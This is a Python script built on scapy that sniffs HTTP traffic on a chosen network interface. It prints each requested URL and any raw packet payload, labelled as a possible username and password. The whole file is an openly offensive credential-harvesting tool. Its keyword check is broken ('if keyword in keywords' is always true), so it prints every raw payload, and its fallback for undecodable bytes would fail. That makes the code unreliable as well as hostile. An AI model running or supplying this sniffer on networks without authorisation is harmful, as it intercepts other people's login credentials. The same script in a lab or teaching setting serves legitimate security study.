#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import argparse


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify an interface to capture packets.")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    try:
        return packet[http.HTTPRequest].Host.decode('utf-8') + packet[http.HTTPRequest].Path.decode('utf-8')
    except UnicodeDecodeError:
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        try:
            load = packet[scapy.Raw].load.decode('utf-8')
        except UnicodeDecodeError:
            load = packet[scapy.Raw].load
        keywords = ["username", "user", "uname", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in keywords:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username/Password > " + login_info + "\n\n")

options = get_argument()
sniff(options.interface)